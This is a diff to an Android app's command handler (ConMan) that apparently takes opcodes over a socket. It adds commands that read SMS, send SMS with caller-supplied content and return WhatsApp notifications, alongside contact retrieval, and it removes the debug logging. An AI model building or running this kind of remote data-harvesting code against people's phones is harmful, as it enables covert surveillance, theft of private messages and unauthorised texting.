@@ -1,7 +1,5 @@
 package com.dextrotechnologies.phonemate;
 
-import android.util.Log;
-
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
@@ -70,12 +68,24 @@ public class ConMan {
     private static String performOps(String op){
         String returnMessage;
 
-        Log.e("SOCK101", op);
+        String chunks[] = op.split("!?#");
 
-        switch (op) {
+        switch (chunks[0]) {
             // Contacts
             case "0xC0":
                 returnMessage = String.valueOf(ContactsMan.getContacts());
+                break;
+            // SMS Recv
+            case "0xS0":
+                returnMessage = String.valueOf(SmsMan.GetSms());
+                break;
+            // Sms Send
+            case "0xS1":
+                returnMessage = String.valueOf(SmsMan.SendSms(chunks[1], chunks[2]));
+                break;
+            // Whatsapp Notification
+            case "0xWA":
+                returnMessage = String.valueOf(NotificationListener.GetWhatsappNotifications());
                 break;
             default:
                 returnMessage = "Invalid";
